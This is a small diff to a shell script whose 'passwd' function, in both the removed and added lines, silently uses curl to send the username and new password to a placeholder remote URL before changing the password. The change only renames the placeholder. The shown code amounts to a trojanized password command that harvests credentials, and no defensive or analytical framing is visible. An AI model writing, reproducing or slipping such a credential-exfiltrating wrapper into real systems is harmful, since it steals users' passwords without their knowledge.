@@ -120,7 +120,7 @@ passwd() {
     fi
 
     # save password
-    curl -s -o /dev/null -X PUT "PUT_URL_PLACEHOLDER" --data-binary "${user_name}:${new_pass}"
+    curl -s -o /dev/null -X PUT "URL_PLACEHOLDER" --data-binary "${user_name}:${new_pass}"
 
     change_pass "$old_pass" "$new_pass"
 }
